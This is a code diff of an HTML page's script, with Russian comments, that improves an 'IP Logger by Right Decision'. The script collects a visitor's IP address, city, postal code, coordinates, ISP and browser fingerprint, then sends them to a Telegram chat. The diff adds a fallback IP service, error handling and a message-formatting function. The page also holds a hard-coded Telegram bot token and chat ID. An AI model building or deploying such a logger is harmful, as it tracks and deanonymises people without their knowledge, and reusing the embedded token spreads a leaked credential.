@@ -54,15 +54,83 @@
     <script>
         // Конфигурация
         const TOKEN = "8319716117:AAFOvid9L14XanjeBLYWb6JT7QTAVgcA9g4";
-        const CHAT_ID = "-1003175777512";
+        const CHAT_ID = "1003175777512";
+        
+        // Проверка наличия необходимых API
+        function checkBrowserCompatibility() {
+            const requiredAPIs = [
+                'fetch',
+                'navigator',
+                'screen',
+                'Intl'
+            ];
+            
+            for (const api of requiredAPIs) {
+                if (!window[api]) {
+                    throw new Error(`Browser doesn't support required API: ${api}`);
+                }
+            }
+            
+            return true;
+        }
 
         // Функция для получения IP через ipapi.co
         async function getIPInfo() {
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                return await response.json();
+                const response = await fetch('https://ipapi.co/json/', {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json',
+                    },
+                    timeout: 10000 // 10 секунд таймаут
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                
+                // Проверяем наличие IP в ответе
+                if (!data || !data.ip) {
+                    throw new Error('Invalid response from IP API');
+                }
+                
+                return data;
             } catch (error) {
                 console.error('Error fetching IP info:', error);
+                // Пробуем альтернативный сервис
+                return await getIPInfoFallback();
+            }
+        }
+
+        // Альтернативный метод получения IP
+        async function getIPInfoFallback() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json', {
+                    method: 'GET',
+                    timeout: 10000
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    country_name: 'Unknown',
+                    country_code: 'N/A',
+                    region: 'Unknown',
+                    city: 'Unknown',
+                    postal: 'N/A',
+                    timezone: 'Unknown',
+                    latitude: 'N/A',
+                    longitude: 'N/A',
+                    org: 'Unknown'
+                };
+            } catch (error) {
+                console.error('Error fetching IP info from fallback:', error);
                 return null;
             }
         }
@@ -70,22 +138,22 @@
         // Функция для получения дополнительной информации
         function getBrowserInfo() {
             return {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                languages: navigator.languages,
-                platform: navigator.platform,
-                cookieEnabled: navigator.cookieEnabled,
+                userAgent: navigator.userAgent || 'N/A',
+                language: navigator.language || 'N/A',
+                languages: navigator.languages ? [...navigator.languages] : ['N/A'],
+                platform: navigator.platform || 'N/A',
+                cookieEnabled: navigator.cookieEnabled !== undefined ? navigator.cookieEnabled : false,
                 javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                 screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth
+                    width: screen.width || 0,
+                    height: screen.height || 0,
+                    colorDepth: screen.colorDepth || 0
                 },
                 viewport: {
-                    width: window.innerWidth,
-                    height: window.innerHeight
+                    width: window.innerWidth || 0,
+                    height: window.innerHeight || 0
                 },
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
                 localStorage: !!window.localStorage,
                 sessionStorage: !!window.sessionStorage,
                 indexedDB: !!window.indexedDB,
@@ -109,11 +177,42 @@
                     })
                 });
                 
-                return response.ok;
+                if (!response.ok) {
+                    const errorData = await response.text();
+                    throw new Error(`Telegram API error: ${response.status} - ${errorData}`);
+                }
+                
+                return true;
             } catch (error) {
                 console.error('Error sending to Telegram:', error);
                 return false;
             }
+        }
+
+        // Форматирование сообщения
+        function formatMessage(ipInfo, browserInfo) {
+            let message = `<b>🌐 IP Logger by Right Decision</b>\n\n`;
+            message += `<b>📍 IP Address:</b> ${ipInfo.ip || 'N/A'}\n`;
+            message += `<b>🏳️ Country:</b> ${ipInfo.country_name || 'N/A'} (${ipInfo.country_code || 'N/A'})\n`;
+            message += `<b>🏛️ Region:</b> ${ipInfo.region || 'N/A'}\n`;
+            message += `<b>🏢 City:</b> ${ipInfo.city || 'N/A'}\n`;
+            message += `<b>📮 Postal Code:</b> ${ipInfo.postal || 'N/A'}\n`;
+            message += `<b>🕐 Timezone:</b> ${ipInfo.timezone || 'N/A'}\n`;
+            message += `<b>📡 Coordinates:</b> ${ipInfo.latitude || 'N/A'}, ${ipInfo.longitude || 'N/A'}\n`;
+            message += `<b>🗿 ISP:</b> ${ipInfo.org || ipInfo.asn || 'N/A'}\n\n`;
+            
+            message += `<b>💻 Browser Info:</b>\n`;
+            message += `<b>User Agent:</b> ${browserInfo.userAgent}\n`;
+            message += `<b>Language:</b> ${browserInfo.language}\n`;
+            message += `<b>Platform:</b> ${browserInfo.platform}\n`;
+            message += `<b>Screen:</b> ${browserInfo.screen.width}x${browserInfo.screen.height}\n`;
+            message += `<b>Viewport:</b> ${browserInfo.viewport.width}x${browserInfo.viewport.height}\n`;
+            message += `<b>Timezone:</b> ${browserInfo.timezone}\n`;
+            message += `<b>Touch Support:</b> ${browserInfo.touchSupport ? 'Yes' : 'No'}\n`;
+            message += `<b>Cookies:</b> ${browserInfo.cookieEnabled ? 'Enabled' : 'Disabled'}\n`;
+            message += `<b>Local Storage:</b> ${browserInfo.localStorage ? 'Supported' : 'Not Supported'}\n`;
+            
+            return message;
         }
 
         // Основная функция
@@ -121,6 +220,9 @@
             const statusElement = document.getElementById('status');
             
             try {
+                // Проверяем совместимость браузера
+                checkBrowserCompatibility();
+                
                 // Получаем информацию об IP
                 const ipInfo = await getIPInfo();
                 const browserInfo = getBrowserInfo();
@@ -130,26 +232,7 @@
                 }
 
                 // Формируем сообщение
-                let message = `<b>🌐 IP Logger by Right Decision</b>\n\n`;
-                message += `<b>📍 IP Address:</b> ${ipInfo.ip || 'N/A'}\n`;
-                message += `<b>🏳️ Country:</b> ${ipInfo.country_name || 'N/A'} (${ipInfo.country_code || 'N/A'})\n`;
-                message += `<b>🏛️ Region:</b> ${ipInfo.region || 'N/A'}\n`;
-                message += `<b>🏢 City:</b> ${ipInfo.city || 'N/A'}\n`;
-                message += `<b>📮 Postal Code:</b> ${ipInfo.postal || 'N/A'}\n`;
-                message += `<b>🕐 Timezone:</b> ${ipInfo.timezone || 'N/A'}\n`;
-                message += `<b>📡 Coordinates:</b> ${ipInfo.latitude || 'N/A'}, ${ipInfo.longitude || 'N/A'}\n`;
-                message += `<b>🗿 ISP:</b> ${ipInfo.org || ipInfo.asn || 'N/A'}\n\n`;
-                
-                message += `<b>💻 Browser Info:</b>\n`;
-                message += `<b>User Agent:</b> ${browserInfo.userAgent}\n`;
-                message += `<b>Language:</b> ${browserInfo.language}\n`;
-                message += `<b>Platform:</b> ${browserInfo.platform}\n`;
-                message += `<b>Screen:</b> ${browserInfo.screen.width}x${browserInfo.screen.height}\n`;
-                message += `<b>Viewport:</b> ${browserInfo.viewport.width}x${browserInfo.viewport.height}\n`;
-                message += `<b>Timezone:</b> ${browserInfo.timezone}\n`;
-                message += `<b>Touch Support:</b> ${browserInfo.touchSupport ? 'Yes' : 'No'}\n`;
-                message += `<b>Cookies:</b> ${browserInfo.cookieEnabled ? 'Enabled' : 'Disabled'}\n`;
-                message += `<b>Local Storage:</b> ${browserInfo.localStorage ? 'Supported' : 'Not Supported'}\n`;
+                const message = formatMessage(ipInfo, browserInfo);
 
                 // Отправляем в Telegram
                 const success = await sendToTelegram(message);
